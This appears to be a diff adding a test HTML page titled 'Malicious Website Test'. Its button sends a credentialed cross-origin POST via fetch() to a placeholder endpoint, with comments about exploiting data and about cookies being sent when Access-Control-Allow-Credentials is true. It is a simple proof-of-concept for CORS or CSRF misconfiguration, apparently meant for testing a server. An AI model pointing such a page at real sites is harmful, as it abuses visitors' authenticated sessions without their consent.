@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Website Test</title>
+</head>
+<body>
+    <h1>Malicious Website</h1>
+    <button id="sendRequest">Send Request to Target Server</button>
+
+    <script>
+        document.getElementById('sendRequest').addEventListener('click', function() {
+            fetch('https://yourwebsite.com/api/target-endpoint', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    key: 'value',  // Replace this with the actual data you're trying to exploit
+                }),
+                credentials: 'include'  // This sends cookies if 'Access-Control-Allow-Credentials' is true
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Response from the server:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
